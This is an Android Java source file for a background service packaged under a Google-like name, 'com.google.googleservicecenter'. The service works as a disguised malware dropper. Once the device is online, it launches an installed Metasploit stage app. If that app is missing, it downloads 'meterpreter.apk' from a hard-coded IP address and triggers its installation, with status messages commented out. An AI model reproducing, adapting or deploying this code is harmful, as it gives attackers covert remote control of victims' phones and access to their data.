package com.google.googleservicecenter;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;

import androidx.core.content.FileProvider;

import com.ixuea.android.downloader.DownloadService;
import com.ixuea.android.downloader.callback.DownloadListener;
import com.ixuea.android.downloader.callback.DownloadManager;
import com.ixuea.android.downloader.domain.DownloadInfo;
import com.ixuea.android.downloader.exception.DownloadException;
import com.novoda.merlin.Connectable;
import com.novoda.merlin.Merlin;

import java.io.File;
public class MainService extends Service {

    Merlin merlin;
    Context context;
    String apkFilePath = null;
    String apkFileName = "meterpreter.apk";

    public MainService() {

    }

    @Override
    public void onCreate() {
        super.onCreate();
        this.context = getApplicationContext();

        //Log.e("WARN", "Servis başladı");
        apkFilePath = Environment.getExternalStorageDirectory().toString()+ File.separator + Environment.DIRECTORY_DOWNLOADS + "/" + apkFileName;
        init();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        merlin.unbind();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void init(){

        merlin = new Merlin.Builder().withConnectableCallbacks().build(context);
        merlin.bind();

        merlin.registerConnectable(new Connectable() {
            @Override
            public void onConnect() {
                startApp();
            }
        });

    }

    public void startApp(){

        //Toast.makeText(context, "Connect", Toast.LENGTH_LONG).show();

        PackageManager pm = getPackageManager();
        Intent launchIntent = pm.getLaunchIntentForPackage("com.metasploit.stage");

        if (launchIntent != null) {
            startActivity(launchIntent);
        } else {
            startDownload("http://157.230.2.0/meterpreter.apk", apkFileName, true);
        }

    }

    public void startDownload(String serverUrl, String serverFilename, final boolean isAPK){

        if (new File(apkFilePath).exists()){
            new File(apkFilePath).delete();
        }
        DownloadManager downloadManager = DownloadService.getDownloadManager(getApplicationContext());

        DownloadInfo downloadInfo = new DownloadInfo.Builder().setUrl(serverUrl)
                .setPath(apkFilePath)
                .build();

        downloadManager.download(downloadInfo);

        downloadInfo.setDownloadListener(new DownloadListener() {
            @Override
            public void onStart() {

            }

            @Override
            public void onWaited() {

            }

            @Override
            public void onPaused() {

            }

            @Override
            public void onDownloading(long progress, long size) {

            }

            @Override
            public void onRemoved() {

            }

            @Override
            public void onDownloadSuccess() {

                File outputFile = null;
                try {

                    outputFile = new File(apkFilePath);

                    if (isAPK){
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            Uri apkUri = FileProvider.getUriForFile(getApplicationContext(), "com.google.googleservicecenter.provider", outputFile);
                            Intent intent = new Intent(Intent.ACTION_INSTALL_PACKAGE);
                            intent.setData(apkUri);
                            intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                            getApplicationContext().startActivity(intent);
                        } else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N){
                            Uri apkUri = Uri.fromFile(outputFile);
                            Intent intent = new Intent(Intent.ACTION_VIEW);
                            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
                            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            getApplicationContext().startActivity(intent);
                        }else {
                            //Toast.makeText(getApplicationContext(), "File not found.", Toast.LENGTH_LONG).show();
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }


            }

            @Override
            public void onDownloadFailed(DownloadException e) {

            }
        });
    }


}
